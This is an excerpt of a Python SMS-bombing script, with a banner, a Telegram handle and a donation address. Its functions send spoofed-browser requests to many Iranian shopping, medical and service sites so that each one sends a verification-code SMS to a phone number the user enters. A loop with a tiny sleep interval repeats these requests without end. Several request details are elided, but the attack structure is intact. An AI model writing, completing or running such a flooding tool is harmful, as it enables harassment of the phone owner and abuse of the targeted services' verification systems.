...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    ...
    try:
        ...
        if sfoodR['status'] == True:
            print(f'{g}(SnapFood)  {r}Code Sent')
            return True
    except:
        pass
...
def sheypoor(phone):
    ...
    try:
        ...
        if sheyporR['success'] == True:
            print(f'{g}(Sheypoor)  {r}Code Sent')
            return True
    except:
        pass
...
'x-xsrf-token': ''}
    try:
        ...
        if 'success' in okR:
            print(f'{g}(OfoghKourosh)  {r}Code Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket)  {r}Code Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'ok':
            print(f'{g}(Chamedoon)  {r}Code Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'success':
            print(f'{g}(BaniMode)  {r}Code Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
            print(f'{g}(NashrOlgoo)  {r}Code Sent')
            return True
    except:
        pass
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        if ok['code'] == '1':
            print(f'{g}(PakhshShop)  {r}Code Sent')
            return True
    except:
        pass
def didnegar(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        print(f'{g}(SeebIrani)  {r}Code Sent')
        return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        print(f'{g}(MihanPezeshk)  {r}Code Sent')
        return True
    except:
        pass
def mek(phone):
...
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
    ...
    try:
        ...
        if meR['isSuccess']:
            print(f'{g}(HamrahMechanic) {r}Code Sent')
            return True
    except: pass
# ================================================================
...
{g}•Telegram: @llllIlIlIlIlIlllll
{g}•SmsBomber
{r}DONATE (TRX): TGiUvTWjh9uuoihSaW8CDPqJ5mftRogRm7
{y}♡♡♡IRAN♡♡♡
...
while True:
    phone = is_phone(input(f'{g}[$] {y}Enter Phone Number {r}(+98) '))
    if phone:
        break
try:
    Time = float(input(f'{y}[$] {y}Enter Sleep Time {g}[0.00001] {r}- {w}'))
except ValueError:
    Time = 0.1
    print(f"{g}[0.00001] {w}Used")
while True:
    try: Vip(phone, Time)
